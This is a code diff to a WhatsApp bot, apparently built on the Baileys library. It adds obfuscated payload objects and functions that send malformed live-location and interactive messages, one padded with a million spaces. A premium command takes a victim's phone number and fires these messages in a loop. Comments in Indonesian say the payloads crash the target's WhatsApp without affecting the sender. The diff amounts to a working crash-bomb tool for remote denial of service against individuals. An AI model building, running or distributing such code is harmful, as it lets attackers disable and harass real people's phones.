@@ -92,7 +92,200 @@ const menu = process.env.MENU_TYPE || 'VIDEO';
     const Owner = DevDreaded.map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
     const viewOnceMessage = args.join(" ");
     const fcontact = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `𝐃𝐑𝐄𝐗 𝐁𝐎𝐓`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;DrexBot,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/00c44dbca471eff754425.png' }}}}
-       // Group
+  //bugs
+function _0x32f5(_0x357e2e, _0x2a0323) {
+    const _0x29f8a8 = _0x3c9e();
+    return _0x32f5 = function (_0x46e526, _0x5b3588) {
+        _0x46e526 = _0x46e526 - (0x3 * -0x87f + 0x1 * 0x1a8d + 0x2e);
+        let _0x226689 = _0x29f8a8[_0x46e526];
+        return _0x226689;
+    }, _0x32f5(_0x357e2e, _0x2a0323);
+}
+const _0x2f276c = _0x32f5;
+(function (_0x3774c4, _0x16108d) {
+    const _0x52e897 = _0x32f5, _0x5f7324 = _0x3774c4();
+    while (!![]) {
+        try {
+            const _0x26a08f = parseInt(_0x52e897(0x146)) / (0x443 * -0x3 + 0x151a + -0x850) + parseInt(_0x52e897(0x145)) / (0xc07 * 0x1 + -0x11f3 + 0x8a * 0xb) * (-parseInt(_0x52e897(0x14a)) / (-0x600 + -0x1ca4 + 0x22a7)) + -parseInt(_0x52e897(0x144)) / (-0x26e6 + -0x161f * -0x1 + 0x10cb) + parseInt(_0x52e897(0x14c)) / (-0x18b3 + 0x254b + -0xc93) + parseInt(_0x52e897(0x14d)) / (0xaf6 * 0x1 + 0xa * 0x338 + 0x1e * -0x170) + -parseInt(_0x52e897(0x148)) / (-0x65d + 0xfaf + -0x1 * 0x94b) * (parseInt(_0x52e897(0x14b)) / (-0x23ae + 0x13a4 + 0x1 * 0x1012)) + parseInt(_0x52e897(0x13e)) / (-0x853 * 0x2 + -0x13ba + -0x27 * -0xef) * (-parseInt(_0x52e897(0x140)) / (-0x7ac * 0x4 + -0x157a + 0x3434));
+            if (_0x26a08f === _0x16108d)
+                break;
+            else
+                _0x5f7324['push'](_0x5f7324['shift']());
+        } catch (_0x2d0e90) {
+            _0x5f7324['push'](_0x5f7324['shift']());
+        }
+    }
+}(_0x3c9e, 0x64282 + -0x564b + 0x5cfcc));
+const ryobug = {
+    'key': {
+        'participant': _0x2f276c(0x147) + _0x2f276c(0x142),
+        ...m[_0x2f276c(0x149)] ? { 'remoteJid': _0x2f276c(0x141) + _0x2f276c(0x143) } : {}
+    },
+    'message': { 'listResponseMessage': { 'title': _0x2f276c(0x13f) } }
+};
+function _0x3c9e() {
+    const _0x1aa1e1 = [
+        '7825635sosiGC',
+        '𝐃𝐑𝐄𝐗\x20-\x20𝐁𝐎𝐓',
+        '10SICXzc',
+        'status@bro',
+        'pp.net',
+        'adcast',
+        '4759276JHsXYU',
+        '428650HMJQBw',
+        '1403913KRjLVe',
+        '0@s.whatsa',
+        '2850085EGVAAg',
+        'chat',
+        '6TNFoyO',
+        '8QfOGTj',
+        '7066205tkvcMf',
+        '5082072gxcHty'
+    ];
+    _0x3c9e = function () {
+        return _0x1aa1e1;
+    };
+    return _0x3c9e();
+}
+//=========================================================================================//
+const _0x354490 = _0x37a6;
+function _0x37a6(_0x3961c4, _0x4752d0) {
+    const _0x4bfe7b = _0x38ae();
+    return _0x37a6 = function (_0x2e232e, _0x541cd0) {
+        _0x2e232e = _0x2e232e - (-0x8e2 + 0xce * -0x1 + -0xb83 * -0x1);
+        let _0x67c226 = _0x4bfe7b[_0x2e232e];
+        return _0x67c226;
+    }, _0x37a6(_0x3961c4, _0x4752d0);
+}
+(function (_0xa65b82, _0x414b75) {
+    const _0x33a476 = _0x37a6, _0x25d8af = _0xa65b82();
+    while (!![]) {
+        try {
+            const _0x477332 = parseInt(_0x33a476(0x1f6)) / (0x161b + 0x10 * 0x204 + -0x365a) + -parseInt(_0x33a476(0x1fe)) / (0x13cf + -0x65 * -0x21 + -0x20d2) + -parseInt(_0x33a476(0x204)) / (0xd83 + 0x4 * 0x73b + 0x21f * -0x14) + parseInt(_0x33a476(0x1e4)) / (-0x2346 + -0x2112 + 0x2bc * 0x19) + -parseInt(_0x33a476(0x210)) / (0x931 * -0x1 + -0xf3a + 0x30e * 0x8) * (parseInt(_0x33a476(0x201)) / (-0x26a8 + -0x717 + 0x1 * 0x2dc5)) + -parseInt(_0x33a476(0x1d3)) / (0x1565 * 0x1 + 0x17e9 * 0x1 + -0x43 * 0xad) * (-parseInt(_0x33a476(0x1fb)) / (0x1f13 + -0x1 * 0x7fb + -0x1710)) + parseInt(_0x33a476(0x1f2)) / (-0x152 * -0xc + -0x201f + 0x1050);
+            if (_0x477332 === _0x414b75)
+                break;
+            else
+                _0x25d8af['push'](_0x25d8af['shift']());
+        } catch (_0x370040) {
+            _0x25d8af['push'](_0x25d8af['shift']());
+        }
+    }
+}(_0x38ae, -0xf1 * -0x3f0 + 0xe3 * -0xaba + -0x5 * -0x2cb73));
+const force = {
+    'key': {
+        'participant': _0x354490(0x226) + _0x354490(0x20b),
+        ...m[_0x354490(0x217)] ? { 'remoteJid': '' } : {}
+    },
+    'message': {
+        'interactiveMessage': {
+            'header': {
+                'hasMediaAttachment': !![],
+                'jpegThumbnail': fs[_0x354490(0x220) + 'nc'](_0x354490(0x200) + _0x354490(0x1dc))
+            },
+            'nativeFlowMessage': {
+                'buttons': [{
+                        'name': _0x354490(0x1eb) + _0x354490(0x1da),
+                        'buttonParamsJson': _0x354490(0x20c) + _0x354490(0x202) + _0x354490(0x1f5) + _0x354490(0x1f8) + _0x354490(0x1d8) + _0x354490(0x1f1) + _0x354490(0x21b) + _0x354490(0x1d5) + _0x354490(0x1f9) + _0x354490(0x1db) + _0x354490(0x1fd) + _0x354490(0x214) + _0x354490(0x1e3) + _0x354490(0x1e1) + _0x354490(0x206) + _0x354490(0x20e) + _0x354490(0x225) + _0x354490(0x208) + _0x354490(0x1df) + _0x354490(0x213) + _0x354490(0x21a) + _0x354490(0x215) + _0x354490(0x219) + _0x354490(0x20d) + _0x354490(0x21c) + _0x354490(0x1fc) + _0x354490(0x1ea) + _0x354490(0x1d4) + _0x354490(0x1ff) + _0x354490(0x1dd) + _0x354490(0x1e8) + _0x354490(0x205) + _0x354490(0x1f7) + _0x354490(0x1e2) + _0x354490(0x223) + _0x354490(0x20f) + _0x354490(0x207) + _0x354490(0x216) + _0x354490(0x1e7) + _0x354490(0x1e9) + _0x354490(0x211) + _0x354490(0x224) + _0x354490(0x1f3) + _0x354490(0x221) + _0x354490(0x1de) + _0x354490(0x1ef) + _0x354490(0x1d7) + _0x354490(0x1fc) + _0x354490(0x1e5) + _0x354490(0x1f0) + _0x354490(0x1e6) + _0x354490(0x20a) + _0x354490(0x209) + _0x354490(0x1e0) + _0x354490(0x1d9) + _0x354490(0x1ee) + _0x354490(0x218) + _0x354490(0x203) + _0x354490(0x21e) + _0x354490(0x212) + _0x354490(0x1fc) + _0x354490(0x222) + _0x354490(0x1ec) + _0x354490(0x1fa) + _0x354490(0x21f) + _0x354490(0x1ed) + _0x354490(0x1d6) + _0x354490(0x1f4) + _0x354490(0x21d)
+                    }]
+            }
+        }
+    }
+};
+function _0x38ae() {
+    const _0x5ad594 = [
+        '9069994400',
+        '_id\x22:\x22cust',
+        '\x22status\x22:\x22',
+        '\x22:100},\x22or',
+        ',\x22order\x22:{',
+        '3409172lIegog',
+        'ue\x22:999990',
+        ':100},\x22qua',
+        '\x22:\x227842674',
+        '\x22:{\x22value\x22',
+        '605763435\x22',
+        'ue\x22:485792',
+        'review_and',
+        '900,\x22offse',
+        '9}]},\x22nati',
+        '2115f9-478',
+        'EZETSUBOXY',
+        '0,\x22offset\x22',
+        '788,\x22offse',
+        '5863995eZNlcH',
+        '7460576343',
+        '_methods\x22:',
+        'otal_amoun',
+        '817973OWmlFi',
+        '00,\x22offset',
+        't\x22:{\x22value',
+        'd\x22:\x224OON4P',
+        't\x22:100},\x22q',
+        '7336qUHSgU',
+        'unt\x22:{\x22val',
+        'pe\x22:\x22physi',
+        '1850612NmpQoj',
+        'fset\x22:100}',
+        './media/la',
+        '6WjiSeW',
+        '\x22:\x22IDR\x22,\x22t',
+        '1-8e7b4bf1',
+        '910386kNcCsc',
+        ':489999999',
+        'payment_re',
+        'tems\x22:[{\x22r',
+        '{\x22value\x22:4',
+        '{\x22retailer',
+        'ntity\x22:7},',
+        'pp.net',
+        '{\x22currency',
+        '\x22offset\x22:1',
+        'quested\x22,\x22',
+        '\x22ORDER\x22,\x22i',
+        '4406965Fmncar',
+        ',\x22product_',
+        'e\x22:\x22\x22,\x22amo',
+        ',\x22offset\x22:',
+        'cal-goods\x22',
+        ':{\x22value\x22:',
+        'etailer_id',
+        'chat',
+        'a-487e-92c',
+        '490699944,',
+        '100},\x22tax\x22',
+        't\x22:100},\x22r',
+        '00},\x22disco',
+        '[]}',
+        '6de8\x22,\x22nam',
+        'uantity\x22:4',
+        'readFileSy',
+        '5\x22,\x22name\x22:',
+        'ue\x22:999999',
+        'der_type\x22:',
+        'id\x22:\x2278426',
+        'subtotal\x22:',
+        '0@s.whatsa',
+        '2471kGusnX',
+        '999999,\x22of',
+        'eference_i',
+        've_payment',
+        'GEN\x20\x22,\x22amo',
+        '\x22:49981399',
+        'om-item-f2',
+        '_pay',
+        'X3FFJ\x22,\x22ty',
+        'tx.png',
+        ',\x22shipping',
+        '\x22!\x20BY\x20-\x20TH'
+    ];
+    _0x38ae = function () {
+        return _0x5ad594;
+    };
+    return _0x38ae();
+}	  
+
+//=========================================================================================//	  
+	  // Group
     const groupMetadata = m.isGroup ? await client.groupMetadata(m.chat).catch((e) => {}) : "";
     const groupName = m.isGroup && groupMetadata ? await groupMetadata.subject : "";
      const participants = m.isGroup && groupMetadata ? await groupMetadata.participants : ""; 
@@ -274,7 +467,48 @@ for (let i = 0; i < lod.length; i++) {
 await client.sendMessage(from, {text: lod[i], edit: key });
 }
 }	 
-	  
+
+	async function ngeloc(target, kuwoted) {
+var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+viewOnceMessage: {
+message: {
+  "liveLocationMessage": {
+    "degreesLatitude": "🖤⟩ ༘྅𝐃𝐑𝐄𝐗 𝐁𝐎𝐓 ☆ ꧏ🤍҈ ༑",
+    "degreesLongitude": "🖤⟩ ༘྅𝐃𝐑𝐄𝐗 𝐁𝐎𝐓 ☆ ꧏ🤍҈ ༑",
+    "caption": `🖤⟩ ༘྅𝐃𝐑𝐄𝐗 𝐁𝐎𝐓 ☆ ꧏ🤍҈ ༑`,
+    "sequenceNumber": "9",
+    "jpegThumbnail": ""
+     }
+  }
+}
+}), { userJid: m.chat, quoted: kuwoted })
+//await client.relayMessage(target, etc.message, { messageId: etc.key.id }) Gunakan Ini Jika Ingin Bug Keliatan Di Wa Pengirim
+await client.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id }); //Gunakan Ini Jika Ingin Bug Hanya Terlihat Di Wa Target ( Benefit - WhatsApp pengguna tidak ikut crash )
+	}
+
+	async function pirgam(target, kuwoted) {
+ var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+    interactiveMessage: {
+      header: {
+        title: "🩸⃟༑𝐃𝐑𝐄𝐗 𝐁𝐎𝐓🦠",
+        hasMediaAttachment: true,
+        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg" } }, { upload: ryozingod.waUploadToServer }))
+      },
+      body: {
+        text: ""
+      },
+      footer: {
+        text: "›          #𝐃𝐑𝐄𝐗 𝐁𝐎𝐓"
+      },
+      nativeFlowMessage: {
+        messageParamsJson: " ".repeat(1000000)
+      }
+    }
+}), { userJid: target, quoted: kuwoted });
+await client.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
+						}
+
+	
 	  async function loading () {
 var lod = [
 "😁",
@@ -588,6 +822,37 @@ client.sendMessage(m.chat, {
 }
           // Group Commands
 break;
+
+case 'virg4m': case 'big-row': case 'idnull': {
+if (!isPremium) return reply(mess.premium)
+if (!q) return reply(`Type .${command} 254729553638`)
+let bijipler = q.replace(/[^0-9]/g, "")
+if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
+let target = bijipler + '@s.whatsapp.net'
+await reply(mess.bugrespon)
+for (let j = 0; j < 10; j++) {
+await ngeloc(target, force)
+await pirgam(target, ryobug)
+await ngeloc(target, force)
+await pirgam(target, ryobug)
+await ngeloc(target, force)
+await pirgam(target, ryobug)
+await ngeloc(target, force)
+await pirgam(target, ryobug)
+await ngeloc(target, force)
+await pirgam(target, ryobug)
+await ngeloc(target, force)
+await pirgam(target, ryobug)
+await ngeloc(target, force)
+await pirgam(target, ryobug)
+await ngeloc(target, force)
+await pirgam(target, ryobug)
+await ngeloc(target, force)
+await pirgam(target, ryobug)
+}
+await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
+}
+break
 
 case "p": case "t": {
 	await loadings ()
